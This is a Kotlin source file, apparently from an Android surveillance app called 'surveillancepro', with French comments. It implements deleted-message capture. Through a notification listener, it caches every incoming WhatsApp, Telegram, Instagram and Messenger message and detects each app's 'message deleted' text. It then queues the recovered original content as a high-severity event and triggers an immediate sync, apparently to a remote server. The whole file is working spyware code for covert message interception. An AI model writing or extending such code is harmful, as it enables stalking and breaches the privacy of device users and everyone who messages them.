package com.surveillancepro.android.services

import android.content.Context
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap

/**
 * Capture des messages supprimés - SANS ROOT
 * 
 * MÉTHODE INTELLIGENTE:
 * Le NotificationListener capture TOUS les messages dès leur arrivée.
 * Si un message est supprimé par l'expéditeur (WhatsApp "Ce message a été supprimé"),
 * on a DÉJÀ le contenu original!
 * 
 * FONCTIONNEMENT:
 * 1. Stocke temporairement tous les messages reçus (cache 24h)
 * 2. Détecte les notifications "message supprimé"
 * 3. Retrouve le message original dans le cache
 * 4. Envoie une alerte avec le contenu supprimé
 * 
 * APPS SUPPORTÉES:
 * - WhatsApp ("Ce message a été supprimé")
 * - Telegram ("Message supprimé")
 * - Instagram ("Message non disponible")
 * - Messenger
 */
object DeletedMessageCapture {
    
    private const val TAG = "DeletedMessageCapture"
    
    // Cache des messages récents (clé = hash du message, valeur = contenu)
    private val messageCache = ConcurrentHashMap<String, CachedMessage>()
    
    // Patterns qui indiquent un message supprimé
    private val DELETED_PATTERNS = mapOf(
        "com.whatsapp" to listOf(
            "ce message a été supprimé",
            "this message was deleted",
            "este mensaje fue eliminado",
            "diese nachricht wurde gelöscht",
            "vous avez supprimé ce message",
            "you deleted this message",
        ),
        "org.telegram.messenger" to listOf(
            "message supprimé",
            "deleted message",
            "mensaje eliminado",
        ),
        "com.instagram.android" to listOf(
            "message non disponible",
            "message unavailable",
            "contenu non disponible",
        ),
        "com.facebook.orca" to listOf(
            "message supprimé",
            "removed a message",
            "a retiré un message",
        ),
    )
    
    // Durée de rétention du cache (24 heures)
    private const val CACHE_DURATION_MS = 24 * 60 * 60 * 1000L
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    /**
     * Stocke un message dans le cache.
     * Appelé par SupervisionNotificationListener pour chaque message reçu.
     */
    fun cacheMessage(
        packageName: String,
        sender: String,
        message: String,
        app: String,
        timestamp: Long = System.currentTimeMillis()
    ) {
        // Créer une clé unique basée sur l'expéditeur et le début du message
        val cacheKey = generateCacheKey(packageName, sender)
        
        val cachedMessage = CachedMessage(
            packageName = packageName,
            sender = sender,
            message = message,
            app = app,
            timestamp = timestamp,
        )
        
        messageCache[cacheKey] = cachedMessage
        
        // Nettoyer les vieux messages
        cleanOldMessages()
        
        Log.d(TAG, "Message cached: $sender -> ${message.take(30)}...")
    }
    
    /**
     * Vérifie si un message est une notification de suppression.
     * Si oui, retrouve le message original et envoie une alerte.
     */
    fun checkForDeletedMessage(
        context: Context,
        packageName: String,
        sender: String,
        message: String,
        app: String
    ): Boolean {
        val patterns = DELETED_PATTERNS[packageName] ?: return false
        
        // Vérifier si le message correspond à un pattern de suppression
        val isDeleted = patterns.any { pattern ->
            message.lowercase().contains(pattern)
        }
        
        if (!isDeleted) return false
        
        Log.d(TAG, "Deleted message detected from $sender in $app")
        
        // Chercher le message original dans le cache
        val cacheKey = generateCacheKey(packageName, sender)
        val originalMessage = messageCache[cacheKey]
        
        val queue = EventQueue.getInstance(context)
        
        if (originalMessage != null && originalMessage.message != message) {
            // Message original trouvé!
            queue.enqueue("deleted_message_recovered", mapOf(
                "app" to app,
                "packageName" to packageName,
                "sender" to sender,
                "originalMessage" to originalMessage.message,
                "deletedAt" to dateFormat.format(Date()),
                "originalTimestamp" to dateFormat.format(Date(originalMessage.timestamp)),
                "recovered" to true,
                "severity" to "high",
            ))
            
            Log.d(TAG, "Original message recovered: ${originalMessage.message.take(50)}...")
            
            // Sync immédiat - c'est important!
            SyncWorker.triggerNow(context)
            
            return true
        } else {
            // Message original non trouvé, mais on signale quand même la suppression
            queue.enqueue("deleted_message_detected", mapOf(
                "app" to app,
                "packageName" to packageName,
                "sender" to sender,
                "deletedAt" to dateFormat.format(Date()),
                "recovered" to false,
                "note" to "Message original non trouvé dans le cache",
            ))
            
            return true
        }
    }
    
    /**
     * Génère une clé de cache unique pour un expéditeur.
     */
    private fun generateCacheKey(packageName: String, sender: String): String {
        return "$packageName|${sender.lowercase().trim()}"
    }
    
    /**
     * Nettoie les messages plus vieux que CACHE_DURATION_MS.
     */
    private fun cleanOldMessages() {
        val now = System.currentTimeMillis()
        val keysToRemove = messageCache.entries
            .filter { now - it.value.timestamp > CACHE_DURATION_MS }
            .map { it.key }
        
        keysToRemove.forEach { messageCache.remove(it) }
        
        if (keysToRemove.isNotEmpty()) {
            Log.d(TAG, "Cleaned ${keysToRemove.size} old messages from cache")
        }
    }
    
    /**
     * Retourne les statistiques du cache.
     */
    fun getCacheStats(): Map<String, Any> = mapOf(
        "cachedMessages" to messageCache.size,
        "oldestMessage" to (messageCache.values.minOfOrNull { it.timestamp } ?: 0),
        "newestMessage" to (messageCache.values.maxOfOrNull { it.timestamp } ?: 0),
    )
    
    data class CachedMessage(
        val packageName: String,
        val sender: String,
        val message: String,
        val app: String,
        val timestamp: Long,
    )
}
